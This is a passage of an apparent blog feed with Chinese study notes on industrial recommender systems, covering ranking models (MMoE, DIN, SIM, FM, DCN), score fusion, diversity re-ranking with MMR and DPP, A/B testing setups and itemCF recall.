        <content type="html"><![CDATA[<h1 id="粗排和精排">粗排和精排</h1><p>很相似, 但是精排模型更大, 特征更多.</p><p>输入用户特征, 物品特征以及统计特征, 模型预测并输出相关指标, 最终我们对输出指标打分, 这个分数就作为最终排序分数.</p><p>回忆一下指标:</p><ul><li>点击率(CTR): 点击次数 / 曝光次数<br /></li><li>点赞率: 点赞次数 / 点击次数<br /></li><li>收藏率: 收藏次数 / 点击次数<br /></li><li>转发率: 转发次数 / 点击次数</li></ul><p><img src="粗排精排.png" /></p><p>我们首先对各种指标进行预测, 然后融合这些预估分数(比如加权), 然后对结果做截断和排序.</p><h2 id="特征数据">特征数据</h2><h3 id="profile">Profile</h3><p>主要描述静态的用户和物品的特征</p><h4 id="user-profile">User Profile</h4><ul><li>用户id(在对应阶段做embedding)<br /></li><li>人口统计学数据: 性别, 年龄<br /></li><li>账号信息: 新老账号, 活跃度<br /></li><li>用户感兴趣的类别, 关键词, 品牌等</li></ul><h4 id="item-profile">Item Profile</h4><ul><li>物品ID(对应阶段做embedding)<br /></li><li>发布时间<br /></li><li>GeoHash, 所在城市<br /></li><li>标题, 类目, 关键词, 品牌<br /></li><li>字数, 图片数, 视频清晰度, 标签数<br /></li><li>内容信息量, 图片美学</li></ul><h3 id="统计特征">统计特征</h3><p>描述一定时间内的用户和物品的统计数据</p><h4 id="用户统计特征">用户统计特征</h4><ul><li>30天/7天/1天/1小时的曝光数,点击数,点赞数等<br /></li><li>对图文笔记点击率, 对视频的点击率<br /></li><li>对不同笔记类型的点击率</li></ul><h4 id="笔记物品统计特征">笔记(物品)统计特征</h4><ul><li>笔记30天/7天/1天/1小时的曝光数,点击数,点赞数等<br /></li><li>男用户的点击率, 女用户的点击率等<br /></li><li>作者的粉丝数量, 发布的笔记数量, 以及笔记的消费指标等</li></ul><h3 id="场景特征context">场景特征(context)</h3><p>场景特征是依据用户请求的当前场景获取的.</p><ul><li>用户当前GeoHash, 城市等<br /></li><li>发送请求的当前时间等<br /></li><li>当前是否是周末, 是否是节日等<br /></li><li>设备信息(比如安卓用户和苹果用户可能倾向不一样)</li></ul><h3 id="特征处理">特征处理</h3><p>离散变量embedding, 连续变量做分桶变成离散, 或者取log(1+x)之类的平滑操作以防止数值过大.</p><h3 id="整体流程">整体流程</h3><p><img src="pipline.png" /></p><p>首先用户发送请求, 主服务器接受请求然后转发给召回服务器, 召回服务器多路召回并把结果(召回物品id)返回给主服务器.</p><p>然后主服务器将物品id信息,用户id信息和context发给排序服务器, 排序服务器从对应数据库中取出数据. 其中用户数据库压力小(因为用户为1), 物品数据库压力大(压力乘以召回数大小). 也因此用户特征可以略微复杂一些,但物品特征需要尽量简单,否则到时候物品服务器压力会很大. 最后统计信息是包含实时结果的, 所以需要尽快将最新信息上传并提取. 特征打包过后丢tf服务器做计算, 最后返回结果.</p><h2 id="多目标模型">多目标模型</h2><h3 id="模型细节">模型细节</h3><p>更加详细一点的模型细节:</p><p><img src="多目标模型.png" /></p><h3 id="损失函数">损失函数</h3><p>训练的时候用的交叉熵做损失函数. 比如点击率预测为p1, 目标为y1.</p><p><span class="math display">\[CrossEntropy(y_1, p_1) = - (y_1 \cdot lnp_1 + (1 - y_1) \cdot ln(1 - p_1))\]</span></p><p>然后我们做加权</p><p><span class="math display">\[Loss = \sum_{i=1}^4 \alpha_i \cdot CrossEntropy(y_i, p_i)\]</span></p><h3 id="训练的困难-类别不平衡">训练的困难-类别不平衡</h3><p>困难: 每100次曝光, 我们可能有10次点击, 90次未点击; 每100次点击, 我们可能有10次收藏, 90次未收藏.</p><p>解决方案: 我们可以做down-sampling, 保留一部分负样本并舍弃其他负样本, 从而让正负样本更平衡, 同时还能节省计算.</p><h3 id="降采样校准">降采样校准</h3><p>但是这样又会有问题, 我们对负样本做downsampling会导致模型对点击率有高估. 所以这里我们还得做校准.</p><p>假设我们对负样本降采样, 使用 <code>$ \alpha n_&#123;-&#125;$</code> 个负样本, 其中 <code>$ \alpha \in (0, 1) $</code> 是采样率.</p><p>那么我们会有:</p><p><span class="math display">\[真实点击率 p_{true} = \frac{n_{+}}{n_{+}+n_{-}}, 预估点击率 p_{pred} = \frac{n_{+}}{n_{+}+ \alpha \cdot n_{-}}\\=&gt; p_{true} = \frac{\alpha \cdot p_{pred}}{(1-p_{pred}) + \alpha \cdot p_{pred}}\]</span></p><h2 id="mmoemulti-gate-mixture-of-experts">MMoE(Multi-gate Mixture-of-Experts)</h2><p>说人话就是输入特征输出<strong>n个expert向量</strong>, 然后生成<strong>指标数量个权重</strong></p><p><img src="MMoE_first.png" /></p><p>这个图里面就是3个expert以及2个指标的例子,然后上层通过权重对expert做加权然后再丢进神经网络预测指标. expert数量是超参数, 需要调.</p><p><img src="MMoE_second.png" /></p><h3 id="存在问题">存在问题</h3><p><strong>polarize</strong>: softmax输出单值接近1, 而其他值接近0.</p><p>这种情况下可能某个指标的预测只用到了一个expert, 而其他的expert就没有派上用场.</p><p><strong>解决方案</strong>: 对softmax的输出用dropout, 如果发生了极化现象且dropout的值恰好为单值1, 那么模型的预测效果就会很差, 这样一来模型就会尽力避免极化.</p><h2 id="三塔模型">三塔模型</h2><p><img src="three_tower.png" /></p><p>其中用户塔和物品塔还是双塔模型里面的.</p><ul><li>用户塔可以很大, 反正只有算单用户向量, 线上实时计算.<br /></li><li>物品塔可以较大, 因为物品塔向量大多数静态, 所以可以计算完毕之后直接离线存储, 需要的时候直接索引提取. 如果击中缓存直接提取, 没击中缓存实时计算.<br /></li><li>交叉塔统计特征的动态变化, 不可以缓存; 一旦有n个物品就需要n次推理, 因此交叉塔需要尽量小.</li></ul><p>然后前面向量计算完了再做concatenation之后丢上层模型计算指标, 这里还是需要n次推理, 不过这里的n次推理计算量比交叉塔大(粗排推理大部分计算量在模型上层).</p><h2 id="fmfactorization-machine">FM(Factorization Machine)</h2><p>FM说白了就是对线性模型的x求二阶交叉并做简化.</p><p><strong>一阶线性</strong>: <code>$ p = b + \sum_&#123;i=1&#125;^d w_ix_i $</code></p><p><strong>二阶线性</strong>: <code>$ p = b + \sum_&#123;i=1&#125;^d w_ix_i + \sum_&#123;i=1&#125;^d\sum_&#123;j=i+1&#125;^d u_&#123;ij&#125;x_ix_j$</code></p><p>这里复杂度为 <code>$ O(d^2) $</code></p><p><strong>Factorization Machine</strong>: <code>$ p = b + \sum_&#123;i=1&#125;^d w_ix_i + \sum_&#123;i=1&#125;^d\sum_&#123;j=i+1&#125;^d (v_i^Tv_j)x_ix_j$</code></p><p>其实就是把 <code>$ u_&#123;ij&#125; $</code> 变成 <code>$ v_i^Tv_j $</code>, 即将权重矩阵分解为了两个小矩阵, 矩阵维度从 d * d 变成了 d * k.</p><p>然后这里作者其实少讲了一点, 就是FM模型其实是对稀疏特征有优化的, 假设x_i和x_j为稀疏特征, 那么交叉之后很多项都会是0, 权重u_ij就会变得非常难学习. 然而FM做了优化之后, 其实最终结果是从O(kn^2)化简成了O(kn). 这里直接贴图不用latex了.</p><p><img src="FM_optimized.png" /></p><p>可以发现最终其实j已经不见了, 其实就是每一个 <code>$ v_&#123;i,l&#125; $</code> 对应一个 <code>$ x_i $</code> . 即计算用的是一阶, 但是混合结果是二阶交叉, 即绕了个弯子: 既利用一阶特征学习到了权重, 又保证模型后面增加的是交叉项.</p><p>然后FM的好处就是一般涉及到特征交叉就可以用, 推荐场合效果显著. 不过现在也逐渐被淘汰了.</p><h2 id="dcn">DCN</h2><p>可以增加模型复杂度并提升模型性能, 其本身可以用在召回或者排序中的所有神经网络层里面. 交叉层公式如下:</p><p><span class="math display">\[x_{i+1} = x_0 \odot (Wx_i + b) + x_0\]</span></p><p>即每次用x_0和上一次的输出结果求hadamard product, 然后最后加上x_0防梯度消失.</p><p>交叉网络即多个交叉层连接</p><p><img src="Cross_Network.png" /></p><p>深度交叉网络则是在交叉网络的基础之上再加上全连网络.</p><p><img src="DCN.png" /></p><h2 id="lhuc">LHUC</h2><p>本身为语音识别里的技术, 希望可以让语音信号能够结合说话者的特征.</p><p><img src="voice_LHUC.png" /></p><p>模型本身对语音信号连接全连层,对说话者特征也是连接全连层并且最后加上一层sigmoid*2让输出在0-2之间, 从而对语音信号有的放大有的缩小.</p><p>如果使用两层那么就要用两个不同的神经网络负责说话者特征的处理, 然后依然是和语音信号求hadamard product. 最后输出.</p><p>推荐系统场合将语音信号换成物品特征, 说话者特征换成用户特征.</p><p><img src="Rank_LHUC.png" /></p><h2 id="加权和交叉">加权和交叉</h2><h3 id="senet">SENet</h3><p>本质是输入m * k矩阵, 对行取平均获得 m * 1 的向量, 然后对 m * 1 向量输入神经网络做升降维变换, 最后将输出的 m * 1向量作为权重矩阵对原 m * k矩阵求加权, 获得最终输出</p><p><img src="SENet.png" /></p><p><strong>注</strong>: SENet里面并不需求输入向量的维度相同, 因为是对行求pool然后再对对应行求加权, 最终维度和输入维度是相同的, 所以其实输入维度并没有影响.</p><h3 id="bilinear-cross">Bilinear Cross</h3><p>通常的特征交叉直接做内积或者hadamard乘积, 而bilinear cross是通过一个中间矩阵连接两边特征. 比如内积就会如下图, 从而生成输出.</p><p><img src="BilinearCross.png" /></p><p>输出大小是一回事, 但是参数矩阵是另外一回事, 有m个field就会产生m**2 / 2 个参数矩阵, 参数矩阵是参数爆炸点.</p><h3 id="fibinet">FiBiNet</h3><p>结合前面两者就是FiBiNet, 首先对embedding做concatenation获得一个向量, 然后对embedding做交叉然后concat获得另外一个向量, 对embedding做SENet加权然后再用bilinear cross获得最后的一个向量对这些做concatenation然后输入上层神经网络.</p><p>总结一下就是: 加权+ 交叉</p><p><img src="FiBiNet.png" /></p><h2 id="用户行为序列建模lastn特征">用户行为序列建模(LastN特征)</h2><p>我们取用户最后交互的n个物品id做embedding得到n个特征, 然后对特征取平均后输出一个向量, 即为用户最近交互物品的特征. 这个适用于双塔,三塔和其他粗排精排模型.</p><p><img src="LastN.png" /></p><h2 id="din模型对lastn的优化">DIN模型(对LastN的优化)</h2><p>上面的lastn我们看到取平均是很简单的一种方法, 我们可以使用更复杂的方式, 比如attention(加权平均)来获得更好的效果.</p><p>对于候选物品, 我们计算它和lastn的相似度, 然后以相似度为权重, 求用户lastn的物品做加权, 然后最后得到的向量就是一种新的用户特征, 输入排序模型之后再来预估点击率点赞率等.</p><p>(可以看成lastn为k,v; 候选物品为q的attention)</p><p>简单平均和attention都适用于精排, 但是对于双塔和三塔只能用简单平均. 这是因为注意力机制需要用到候选物品, 而用户塔会看不到候选物品, 从而并不能把注意力机制用在用户塔</p><p><img src="DIN.png" /></p><h2 id="sim模型">SIM模型</h2><p>大致原理和DIN相似,但是DIN存在问题:注意力的计算和LastN里面的N相关, 因此我们如果用了DIN, 那么N就不可以取太大的值. 因此阿里发了一篇论文, 即SIM, 其对于每个候选物品, 在用户的LastN里面做快速查找, 先找到与候选物品最相似的TopK, 由此来降低复杂度.</p><p>这样一来复杂度从N变成了K, 从而减小了计算量.</p><h3 id="search">Search</h3><p>主要分为hard search和soft search.</p><p>hard search指的是我们直接对LastN里面的物品类目进行筛选.</p><p>soft search指的是我们把物品做embedding, 然后用Knn来找最接近的k个物品. 这种方法效果更好, 但是更费资源且更难实现.</p><h3 id="attention部分">Attention部分</h3><p>这里需要注意, SIM对应的是大N, LastN大的话时间跨度也可能会很大, 因此我们需要使用时间信息来作为辅助数据.</p><ol type="1"><li>我们将用户和某个物品交互的时刻记为 <code>$ \delta $</code><br /></li><li>然后我们对 <code>$ \delta $</code> 做离散化, 再做embedding, 变成向量d.<br /></li><li>我们将时间向量d和物品embedding的向量x做concatenation, 从而得到LastN物品的新表征</li></ol><p>其他部分就完全一致了</p><p><img src="SIM.png" /></p><p>总的来说就是:</p><ol type="1"><li>长序列 &gt; 短序列<br /></li><li>Attention &gt; 简单平均<br /></li><li>SoftSearch &gt; Hard Search<br /></li><li>使用时间信息对长序列有帮助</li></ol><h2 id="预估分数融合">预估分数融合</h2><p>前面的模型可以输出各种分数, 但是我们还需要对各种分数进行融合才能获取到最终的排序, 这里有很多不同的加权方式.</p><p><strong>最简单的直接加权</strong>: <code>$ p_&#123;click&#125; + w_1 \cdot p_&#123;like&#125; + w_2 \cdot p_&#123;collect&#125; ... $</code></p><p><strong>点击率乘其他加权</strong>: <code>$ p_&#123;click&#125; \cdot(1 + w_1 \cdot p_&#123;like&#125; + w_2 \cdot p_&#123;collect&#125; ... )$</code></p><p>这里 <code>$ p_&#123;click&#125; \cdot p_&#123;like&#125; $</code> 其实就是 <code>$ \frac&#123;n_&#123;点击数量&#125;&#125;&#123;n_&#123;曝光数量&#125;&#125; \cdot \frac&#123;n_&#123;点赞数量&#125;&#125;&#123;n_&#123;点击数量&#125;&#125; $</code> , 最终代表的就是曝光后点赞的数量.</p><p><strong>海外某短视频app的融分方式</strong>: <code>$ (1+w_1 \cdot p_&#123;time&#125;)^&#123;a_1&#125; \cdot (1+w_2 \cdot p_&#123;like&#125;)^&#123;a_2&#125; $</code></p><p><strong>国内某视频app的融分方式</strong>: 假设预估时长为 <code>$ p_&#123;time&#125; $</code>, 同时假设其排名为 <code>$ r_&#123;time&#125; $</code>, 那么其得分为 <code>$ \frac&#123;1&#125;&#123;r_&#123;time&#125;^&#123;a&#125; + b&#125; $</code></p><p>最终融合分数: <code>$ \frac&#123;1&#125;&#123;r_&#123;time&#125;^&#123;a_1&#125; + \beta_1&#125; + \frac&#123;1&#125;&#123;r_&#123;click&#125;^&#123;a_2&#125; + \beta_2&#125; + \frac&#123;1&#125;&#123;r_&#123;like&#125;^&#123;a_3&#125; + \beta_3&#125; + ...$</code></p><p><strong>国内某电商app的融分方式</strong>:</p><p>流程: 曝光, 点击, 加购物车, 付款.</p><p>模型估计: <code>$ p_&#123;click&#125; $</code>, <code>$ p_&#123;cart&#125; $</code>, <code>$ p_&#123;pay&#125; $</code></p><p>分数: <code>$ p_&#123;click&#125;^&#123;a_1&#125; \times p_&#123;cart&#125;^&#123;a_2&#125; \times p_&#123;pay&#125;^&#123;a_3&#125; \times price^&#123;a_4&#125;$</code></p><h2 id="视频播放建模">视频播放建模</h2><h3 id="时长">时长</h3><p>区别于图文, 视频类型还涉及到播放时长和完播率.</p><p>然而直接用regression建模播放时长效果并不好, youtube有一篇论文专门解决这个. 我并没有直接去看原论文,这里就只记录作者介绍的方法.</p><p><img src="视频建模.png" /></p><p>这里我们对输出做sigmoid然后对y_true也做1 / 1+y的处理.</p><p>训练的时候我们用交叉熵, 这样最后我们只需要对输出取exp(z)即可表示时长.</p><h3 id="完播">完播</h3><p>两种建模方式</p><p><strong>回归</strong>: 假设视频10分钟, 用户看了4分钟, 那么y=0.4. 我们通过预测播放率来拟合y, <code>$ loss = y \cdot logp + (1-y) \cdot log(1-p) $</code> .</p><p><strong>二分类</strong>: 比如我们将完播80%作为标准, 大于8分钟为正样本, 小于8分钟为负样本. 然后我们来预测模型为正样本的概率.</p><p>然而不管怎么样, 我们都不可以直接把输出的完播率用到融分公式. 因为视频的长度越长相对的完播率就会越低, 所以我们必须先用视频时长来拟合完播率, 最后再用预估完播率做调整.</p><p><span class="math display">\[p_{finish} = \frac{预估完播率}{f视频长度}\]</span></p><p>最后我们用 <code>$ p_&#123;finish&#125; $</code> 来加入融分公式.</p><h1 id="重排">重排</h1><p>多样性抽样: MRR, DPP</p><p>依据为精排分数以及内容多样性, 抽样之后规则打散, 搭配运营策略呈现.</p><h2 id="物品多样性问题">物品多样性问题</h2><p>简单来说就是我们希望最终得到的推荐物品应该是尽可能的多类别, 也即让物品尽可能得不相似. 那么首先就需要一个标准: 相似度怎么度量.</p><h3 id="相似度的度量">相似度的度量</h3><ol type="1"><li>基于物品属性标签(类别, 品牌, 关键词等)<br /></li><li>基于物品向量表征</li></ol><p>一般双塔模型学习到的物品向量效果都不太好; 与之对比, 基于内容的向量表征会有更好的效果(即NLP做文本处理, CV做图片处理)</p><p><strong>基于属性标签</strong>: 比如依据 一级类目, 二级类目, 品牌来计算相似度.</p><p>物品i: 美妆, 彩妆, 香奈儿<br />物品j: 美妆, 香水, 香奈儿</p><p>这么一来, sim_1(i, j) = 1, sim_2(i, j) = 0, sim_3(i, j) = 1.</p><p><strong>基于物品向量</strong>:</p><p><strong>双塔模型</strong>: 由于物品的头部效应, 大部分点击物品都是热门物品, 而对于其他物品, 双塔模型并不能很好的学会它们的表征. 且如果使用物品塔计算的向量, 那么就很难处理新物品.</p><p><strong>基于内容的物品表征</strong>: 对于图片部分我们使用CNN, 对于文本部分我们可以使用bert等模型.</p><p>但是这里涉及一个难点, 如果使用外部训练过的模型, 那么直接迁移到业务范围效果就不太好, 但如果想用自己业务内数据, 那么又存在人工标注的问题.</p><p><strong>解决方案</strong>: CLIP, 具体的在新一篇博客里面已经讲过了, 其主要思想就是匹配的图文获得的score应该大于不匹配的图文, 使用对比的方式我们可以训练出预测图文是否匹配的模型. 其优势在于我们并不需要人工标注, 且小红书本来就包含不少图文数据, 直接丢模型训练就行</p><h3 id="提升多样性的方法">提升多样性的方法</h3><p>首先几亿物品经过召回变成几千, 粗排和精排阶段我们对物品做pointwise打分, 各个指标我们对其进行分数融合获得最终分数reward_i, 这个reward就是表示物品对用户的价值.</p><p>我们对n个候选物品打分, 获得n个reward.</p><p>最后我们对结果进行后处理, 要求物品不仅仅是总分高, 还必须要有多样性, 后面我们还会介绍多样性算法. 其中精排的后处理我们一般称为重排</p><p>注意, 不仅仅是精排, 粗排过后的打分也可以进行后处理的多样性处理, 而且能取得显著效果.</p><h2 id="maximal-marginal-relevancemmr">Maximal Marginal Relevance(MMR)</h2><p>精排对n个物品打分, 融合之后的分数为reward_1...reward_n, 然后我们记物品i和物品j的相似度为sim(i,j), 最终我们从n个物品选出k个, 要求不仅有高reward, 同时多样性也尽可能高.</p><p>假设选中的物品我们记为 <code>$ \delta $</code>, 未选中物品我们记为R</p><p><span class="math display">\[MR_i = \theta \cdot reward_i - (1-\theta) \cdot max_{i \in S} sim(i,j)\]</span></p><p>而MMR就是</p><p><span class="math display">\[\mathop{\arg\max}\limits_{i \in R} MR_i\]</span></p><ol type="1"><li>我们初始化S为空集, R为全集<br /></li><li>选精排分数最高的物品直接从R移到S<br /></li><li>做k-1轮循环, 每轮计算R中所有物品分数 <code>$ \&#123;MR_i\&#125;_&#123;i \in R&#125; $</code><br /></li><li>最后我们选出分数最高的物品, 从R移到S.</li></ol><p><strong>滑动窗口</strong>:</p><p>上述的MMR有个问题, 如果我们选中越多物品(S越大), 那么我们就越难找出一个物品 <code>$ i \in R $</code> 来使得i与S中物品都不相似, 即当S很大的时候, <code>$ max_&#123;j \in S&#125;sim(i, j) $</code>总会为1, 即S中总有元素和选出的元素有高相似度, 导致MMR算法失效.</p><p>解决方案就是滑动窗口, 我们取最后选出的某些物品作为滑动窗口W, 用W来代替MMR公式中的S, 即我们只考虑新加入集合的物品和最新取的某些物品的相似度而不是考虑整体相似度. 从而防止失效问题.</p><h2 id="dpp">DPP</h2><p>Determinantal point process(行列式点过程).</p><h3 id="超平行体">超平行体</h3><p>一组向量可以决定一个k维超平行体.</p><p>比如v1, v2可以决定一个平行四边形;v1, v2, v3可以决定一个平行六面体.</p><p>假设向量线性相关, 那么必定会导致的问题就是向量3落在向量12的平面内导致体积为0, 所以将超平行体的Volumn最大化的过程就是向量多样化的过程.</p><p>而超平行体的体积又可以表现为矩阵的行列式</p><p>给定k个物品, 向量表征为v1,v2...vk(dim为d,且d &gt;= k), 将其记为矩阵V</p><p><span class="math display">\[det(V^TV) = vol(P(v_1, v_2,...v_k)) ^ 2\]</span></p><p>因此,可以用矩阵的行列式来表示物品向量多样性.</p><h3 id="推荐系统">推荐系统</h3><p>Hulu的论文将dpp用在了推荐系统.</p><p><span class="math display">\[\mathop{\arg\max}\limits_{S:\left|S \right|=k} \theta \cdot (\sum_{j \in S} reward_j) + (1-\theta) \cdot log (det(V^T_SV_S))\]</span></p><p>其中可以用 $ A_s $ 来表示 $ V^T_SV_S $</p><p>而DPP是一个<strong>组合优化</strong>问题(从1-n中选出最优的k个元素), 且被认为是一个np hard问题, 只能近似求解.</p><p>每次选物品的时候, 我们去保证</p><p><span class="math display">\[\mathop{\arg\max}\limits_{i \in R} \theta \cdot reward_j + (1-\theta) \cdot log (det(A_{S \cup \{i\}}))\]</span></p><p>每次纳入一个新物品, 矩阵多了一行和一列, 我们希望加入一行一列的同时, 保证行列式尽量大.</p><p>暴力求解的情况, 计算行列式为O(S^3), 又因为物品有R个, 我们需要取出k个, 即O(S^3 * R * k) =&gt; O(nk^4), 而计算矩阵A还需要O(n^2 * d), 即最终复杂度为 $ O(n^2d + nk^4) $</p><p>Hulu的优化是能够利用O(nk^2)计算行列式的值(Cholesky分解).</p><p>Cholesky分解把矩阵A分成 $ A = LL^T $ , 其中L为下三角矩阵, 从而可以用对角线乘积表示行列式. 每次加入一行一列, 我们只需要算出相对原分解产生了哪些变化即可, 从而可以快速算出A_{S {i}}的分解.</p><p>后续滑动窗口还是和MRR一样</p><p>还有规则约束即改变取物品的集合R即可.</p><h2 id="重排的规则">重排的规则</h2><h3 id="最多连续出现k篇某种笔记">最多连续出现k篇某种笔记</h3><p>比如小红书会推荐图文笔记和视频笔记, 假设我们规定最多连续出现5篇图文笔记, 那么如果i到i+4都是图文笔记, 那么i+5必须是视频笔记</p><h3 id="每k篇笔记最多出现一篇某种笔记">每k篇笔记最多出现一篇某种笔记</h3><p>比如运营推广笔记, 我们会给精排分数乘以大于1的系数(boost)来帮助笔记获得曝光.</p><p>boost一般不是用户喜欢的, 出多了会影响用户体验, 所以我们为了限制boost, 限制每k=9篇笔记最多出现一篇运营推广笔记. 即如果i为运营推广笔记, 那么i+1到i+8就不能是运营推广笔记.</p><h3 id="前t篇笔记最多出现k篇某种笔记">前t篇笔记最多出现k篇某种笔记</h3><p>比如排面前t的物品最容易被看到, 对用户体验最重要(小红书top4为首屏).</p><p>而小红书推荐系统有电商卡片笔记, 过多可能会影响体验. 因此前t=1篇笔记最多出现k=0篇电商卡片, 前t=4篇笔记最多出现k=1篇电商卡片</p><h3 id="mr加规则">MR加规则</h3><p>MMR中我们每次从R中选出物品丢到S, 那么如果加上规则, 我们就可以先对R中物品进行规则过滤, 选出满足条件的集合R, 然后对过滤过的R做MMR.</p>]]></content>
      
      
      <categories>
          
          <category> ML Recommender System </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>工业界推荐系统相关</title>
      <link href="/2024/05/13/%E5%B7%A5%E4%B8%9A%E7%95%8C%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E7%9B%B8%E5%85%B3/"/>
      <url>/2024/05/13/%E5%B7%A5%E4%B8%9A%E7%95%8C%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E7%9B%B8%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<h1 id="reference">Reference</h1><p>比较系统的教学在youtube有视频: <a href="https://www.youtube.com/watch?v=nT_74f3E7c4">推荐系统公开课——8小时完整版，讲解工业界真实的推荐系统</a></p><p>国内可以看b站的: <a href="https://www.bilibili.com/video/BV1HZ421U77y/">推荐系统公开课——8小时完整版，讲解工业界真实的推荐系统</a></p><p>搜推相关都会继续学习这位up的视频, blog仅做学习记录使用.</p><h1 id="background">Background</h1><h2 id="data相关">Data相关</h2><p>与推荐系统相关的信号多与产品有关, 举个例子: b站视频发布过后你看到一些相关视频(Impression), 你可能会点进去(Click), 你可能会看完视频(在小红书的示例中被标为ScrollToEnd), 然后点赞收藏投币评论等.</p><p>这些都是相关信号, 表示用户对相关内容是否感兴趣, 它们可以转化成训练数据, 对模型有帮助.</p><h2 id="指标短期指标">指标(短期指标)</h2><ul><li>点击率(CTR): 点击次数 / 曝光次数<br /></li><li>点赞率: 点赞次数 / 点击次数<br /></li><li>收藏率: 收藏次数 / 点击次数<br /></li><li>转发率: 转发次数 / 点击次数<br /></li><li>阅读完成率: 完成阅读次数 / 点击次数 * <span class="math inline">\(f\)</span>(笔记长度)</li></ul><p>需要注意阅读完成率最后需要对笔记长度做归一化保证对长内容公平.</p><p>注意: 指标只是显示用户短期是否感兴趣, 与之对比, 内容多样性如果做得好, 用户可能更具有粘性.</p><h2 id="北极星指标长期指标">北极星指标(长期指标)</h2><ul><li>用户规模: 日活用户数量(DAU), 月活用户数量(MAU)<br /></li><li>消费: 人均使用推荐时长, 人均阅读数量(用户上瘾程度)<br /></li><li>发布: 发布渗透率, 人均发布量.</li></ul><h2 id="实验流程">实验流程</h2><p>离线实验 -&gt; 小流量AB测试 -&gt; 全流量上线</p><ul><li>离线测试即收集用户过去信息, 在历史数据上面做训练和测试, 此过程没有涉及算法和用户的交互, 也不会对用户产生负面或正面影响<br /></li><li>小流量AB测试: 挑选一部分用户做实验组, 一部分做对照组, 对比两者指标完成度, 判断是否可以全流量上线.<br /></li><li>显著优于旧策略即可以考虑全流量上线.</li></ul><h3 id="ab测试">AB测试</h3><p>举例:</p><ul><li>召回团队设计了一种GNN召回通道, 离线实验正向, 需要做AB测试来判断对线上指标影响.<br /></li><li>GNN深度可能可以设置<code>&#123;1, 2, 3&#125;</code>, 我们需要AB测试来选参数</li></ul><h4 id="随机分桶">随机分桶</h4><p>将n个用户随机分为b个桶, 每个桶就有 <code>$ \frac&#123;n&#125;&#123;b&#125; $</code> 个用户</p><p>用哈希函数将用户ID映射为某区间内的整数, 然后将这些整数均匀分为b个桶. 比如下图选1,2,3做实验组, 4做对照组. 然后统计每个桶的业务指标, 比如DAU, CTR等, 如果某个实验组效果显著, 说明策略有效, 可以推全.</p><p><img src="随机分桶.png" /></p><h4 id="分层实验">分层实验</h4><p>一个产品可能包含很多部门, 大家都需要做AB实验. 假如我们将用户分10个桶, 那么最多只能开9个实验, 显然不够使用.</p><p>解决方案是分层实验: <strong>同层互斥, 不同层正交</strong>.</p><ul><li>召回层作为单独一层, 比如GNN实验占了召回层4个桶, 那么其他召回实验就只能选其他6个桶.<br /></li><li>UI层作为另外一层, 和召回层不同层, 因此还是可以使用全部10个桶.</li></ul><p>召回层10%的用户打散分到UI层, UI层选一个桶之后只有10% * 10% = 1% 的交集.</p><p><img src="互斥正交.png" /></p><h4 id="holdout机制">Holdout机制</h4><p>业务考核相关, 为了计算某部门对业务指标的整体提升, 我们可以取10%作为holdout桶, 部门所有AB实验使用其余90%用户, 最终考核用90%用户归一化与10%holdout做diff.</p><p><img src="holdout.png" /></p><p>考核周期结束清除holdout推广实验从90%到100%, 重新划分用户开始下一轮周期.</p><h4 id="反转实验">反转实验</h4><p>当实验策略取得显著效果, 我们希望推全, 但同时有些指标存在滞后性, 需要长期观测.</p><ul><li>保留观测好处: 观测到的指标更准确<br /></li><li>尽快推全好处: 腾出桶供其他同层实验使用, 或是基于新策略做后续开发.</li></ul><p><img src="反转实验.png" /></p><p>反转实验解决方法: 新开一层, 留下小部分用户作为反转桶, 其他用户推全新策略.</p><p>考核周期结束清除holdout的时候依旧保留反转桶, 只将推全的策略运用到holdout上.</p><p>当反转实验完成的时候, 关闭反转实验, 清除反转桶, 真正推广新策略到全部用户.</p><h1 id="pipline">Pipline</h1><p>推荐系统的Pipline一般分为: 召回 -&gt; 粗排 -&gt; 精排 -&gt; 重排</p><ul><li>召回通过不同召回通道取数据, 每个通道取几十几百, 目的是将百万级及以上数据过滤到千级.<br /></li><li>粗排: 用简单的机器学习模型打分, 按分数做排序和截断, 将千级数据过滤到百级.<br /></li><li>精排: 还是打分, 不过区别于粗排, 这里需要上模型复杂度, 怎么准确怎么来.<br /></li><li>重排: 依据精排分数和多样性随机抽样, 依据产品策略和多样性需求来重新内部排列精排结果并插入广告之类运营内容.</li></ul><h1 id="召回">召回</h1><p>召回通道: 协同过滤 (Collaborative Filtering), 双塔模型, 关注的作者等.</p><h2 id="itemcf">itemCF</h2><p>说人话就是依据user对item的喜好程度加上item之间的相似度做推荐.</p><ul><li>用户喜欢物品1, 且物品1和物品2很相似<br /></li><li>那么用户很可能喜欢物品2</li></ul><p><span class="math display">\[\sum_j like(user, item_j) \times sim(item_j, item)\]</span></p><p>其中like表示user对item的喜爱程度, 比如可以用score表示</p><h3 id="similarity">similarity</h3><p>下面是一个计算相似度的例子</p><p><span class="math display">\[sim(i_1, i_2) = \frac{\left| v \right|}{\sqrt{\left|{w_1}\right|\cdot\left|{w_2}\right|}}\]</span></p><p>其中喜欢物品<code>$ i_1 $</code> 的为<code>$ w_1 $</code>, 喜欢物品 <code>$ i_2 $</code>的为 <code>$ w_2 $</code>, v为 <code>$ w_1 \cap w_2 $</code>. 不过此公式为集合形式,没考虑权重, 只有喜欢或不喜欢.</p><h3 id="cosine-similarity">cosine similarity</h3><p>也可以选择用cosine similarity</p><p><span class="math display">\[sim(i_1, i_2) = \frac{\sum_{v \in V} like(v, i_1) \cdot like(v, i_2)}{\sqrt{\sum_{u_1 \in w_1}like^2(u_1, i_1)} \cdot {\sqrt{\sum_{u_2 \in  w_2}like^2(u_2, i_2)}}}\]</span></p><p>这里like只可取0或1的时候就是上面的公式.</p><h3 id="工业化使用">工业化使用</h3><p>由于两两计算物品相似度是非常耗时的工作, 所以工业界采用离线计算的方式.</p><p>离线:</p><ul><li>首先记录 <code>用户-&gt;物品</code> 的索引, 记录每个用户最近感兴趣的物品.<br /></li><li>然后建立 <code>物品-&gt;物品</code> 的索引, 计算物品两两相似度, 并且取最相似的topk, 从而给定一个物品, 我们能够快速返回最相似的k个物品.</li></ul><p>线上:</p><ul><li>给定用户ID, 通过 <code>用户-&gt;物品</code> 索引, 找出用户近期感兴趣物品列表(last_n)<br /></li><li>对于last_n, 我们通过 <code>物品-&gt;物品</code> 索引, 找出最相似的k个物品<br /></li><li>对于取回的nk个物品, 用公式计算用户对物品的感兴趣程度<br 